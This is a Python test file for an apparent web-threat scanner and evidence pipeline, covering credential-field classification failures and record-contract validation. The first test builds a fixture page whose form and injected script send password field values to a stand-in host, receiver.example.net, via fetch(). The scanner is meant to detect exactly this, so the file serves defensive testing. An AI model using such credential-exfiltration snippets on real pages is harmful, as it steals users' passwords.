"""Independent-review regressions: per-field failures and damaged new records."""
from copy import deepcopy
import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.policies.operational import operational_detection_policy
from evidence_pipeline import build_record,build_context
from evidence_pipeline.record_contract import validate_record
from evidence_pipeline.context_inventory import restore


@pytest.mark.parametrize('names',[['good-before','bad','good-after'],['bad'],['bad-one','good','bad-two']])
@pytest.mark.parametrize('javascript',[False,True])
def test_classifier_failures_are_isolated_and_shared_across_html_js(names,javascript):
    policy=operational_detection_policy();calls=[]
    def classifier(field):
        calls.append(field['name'])
        if field['name'].startswith('bad'):raise ValueError('same text')
        return 'password'
    policy.credential_classifier=classifier
    body='<h1>Unrelated preserved content</h1><form method="post" action="https://receiver.example.net/">'
    body+=''.join(f'<input id="{name}" name="{name}" type="password">' for name in names)+'</form>'
    if javascript:body+='<script>'+''.join(f'fetch("https://receiver.example.net/",{{method:"POST",body:document.getElementById("{name}").value}});' for name in names)+'</script>'
    native=L3Scanner(policy).scan_content({'original_url':'https://origin.example.com/','html':{'content':body}})
    assert calls==names  # One producer, reused by JS preparation and all HTML checks.
    classification=native['raw']['html']['credential_classification']
    good=sum(name.startswith('good') for name in names);bad=len(names)-good
    assert sum(x['state']=='evaluated' for x in classification['fields'])==good
    assert len(classification['errors'])==bad
    assert len({e['target']['field_id'] for e in classification['errors']})==bad
    field=next(x for x in native['signals'] if x['id']=='L3-H-02')
    assert field['evidence']['field_count']==good
    assert len(field['evidence']['field_observations'])==len(names)
    assert field['detected'] is (True if good else None)
    form=next(x for x in native['signals'] if x['id']=='L3-H-01')
    assert form['detected'] is (True if good else None)
    post=next(x for x in native['signals'] if x['id']=='L3-H-04')
    assert post['detected'] is True
    assert post['evidence']['credential_form'] is (True if good else None)
    record=build_record('l3',native,request_id='r',attempt=1)
    assert record['execution']['state']=='completed' and record['acquisition']['state']=='observed'
    assert record['analysis']['state']=='partial'
    causes=[c for c in record['causes'] if c['code']=='credential_classification_failed']
    assert len(causes)==bad
    assert all({'L3-H-01','L3-H-02','L3-H-04'}<=set(c['occurrence']['affected_signal_ids']) for c in causes)
    if javascript:
        signal=next(x for x in native['signals'] if x['id']=='L3-J-06')
        assert signal['detected'] is (True if good else None)
        assert all('L3-J-06' in c['occurrence']['affected_signal_ids'] for c in causes)
    model=restore(build_context([record],{'l3':native['raw']}))
    page=next(x['facts'] for x in model['evidence'] if x['kind']=='page')
    assert 'Unrelated preserved content' in page['text']
    model_field=next(x['facts'] for x in model['evidence'] if x['kind']=='check' and x['facts'].get('name')=='credential_field')
    assert model_field['evidence']['field_count']==good
    assert len([x for x in model['evidence'] if x['kind']=='limitation' and x['facts']['description']['code']=='credential_classification_failed'])==bad


@pytest.mark.parametrize('mutation',[
    'predicate_missing','applicability_missing','certainty_missing','contradictory_applicability',
    'dangling_acquisition','dangling_affected','bad_predicate_enum','bad_applicability_enum',
    'bad_certainty','bad_impact','bad_signal_identity','bad_counts','bad_scope','missing_cause_ids'])
def test_v2_record_contract_rejects_damage_before_context_build(mutation):
    # This test covers the existing layer-evidence-1/Builder contract. L0 v3's
    # compact storage contract is tested separately without constructing Builder.
    from l0.parsing import parse_url_stage
    native={**parse_url_stage('https://example.net/').to_dict(),
        'producer_contract':'url-evaluations-2',
        'analysis_execution':{'state':'run','record_count':1},
        'evaluations':[{'name':'stored_v2_check','facts':{'value':'preserved'},
            'predicate':{'statement':'reference matches','result':'matched'},
            'applicability':{'state':'applicable','reason':None},
            'scope':'URL string only','reference_versions':{},
            'interpretation':{'certainty':'technical_observation_only','url_verdict':'not_assessed','limits':'Stored v2 contract'},
            'limitations':[{'code':'query_target_parse_failed','stage':'query_target_resolution',
                'impact_scope':'analysis','target':{'parameter':'next'},'occurrence_id':'v2:query:0'}]}]}
    record=build_record('l0',native,request_id='r',attempt=1);broken=deepcopy(record)
    signal=broken['signals'][0];assessment=signal['assessment']
    if mutation.endswith('_missing'):assessment.pop(mutation.removesuffix('_missing'))
    elif mutation=='contradictory_applicability':signal['state']='not_applicable';assessment['applicability']['state']='applicable'
    elif mutation=='dangling_acquisition':broken['acquisition']['limitation_ids']=['absent-cause']
    elif mutation=='dangling_affected':broken['causes'][0]['occurrence']['affected_signal_ids']=['absent-signal']
    elif mutation=='bad_predicate_enum':assessment['predicate']['result']='certainly_malicious'
    elif mutation=='bad_applicability_enum':assessment['applicability']['state']='yes'
    elif mutation=='bad_certainty':assessment['certainty']='inferred_intent'
    elif mutation=='bad_impact':broken['causes'][0]['occurrence']['impact_scope']='site_unsafe'
    elif mutation=='bad_signal_identity':signal['id']=None
    elif mutation=='bad_counts':broken['execution']['result_counts']['observed']=999
    elif mutation=='bad_scope':signal['scope']=False
    elif mutation=='missing_cause_ids':signal.pop('cause_ids')
    with pytest.raises(ValueError):validate_record(broken)
    with pytest.raises(ValueError):build_context([broken],{'l0':native['raw_evidence']})


def test_explicit_legacy_unknown_is_accepted_without_inventing_applicability():
    native={'analysis_records':[{'analysis_record':{'name':'old','status':'해당없음','value':None}}]}
    record=build_record('l0',native,request_id='r',attempt=1,raw={})
    assert record['execution']['state']=='unrecorded'
    assert record['signals'][0]['state']=='relationship_record_only'
    assert record['signals'][0]['assessment']['applicability']['state']=='unrecorded'
    validate_record(record);build_context([record],{'l0':{}})


def test_native_occurrence_list_does_not_require_legacy_dropped_map():
    from src.records import observation_state
    from evidence_pipeline.record_contract import l1_observation
    occurrence={'code':'infrastructure_organization_unavailable','occurrence_id':'l1:org:1',
        'stage':'asn_organization','impact_scope':'acquisition','target':{'asn':'1'},'reason':'REFUSED'}
    native={'name':'IP·ASN','status':'응답 수신','detail':{'failure_occurrences':[occurrence]}}
    for observation in (observation_state(native),l1_observation(native)):
        assert observation['state']=='partial'
        assert observation['limitations']==[occurrence]
    record=build_record('l1',{'전체상태':'완료','인프라결과_목록':[native]},request_id='r',attempt=1,raw={})
    assert record['acquisition']['state']=='partial' and len(record['causes'])==1
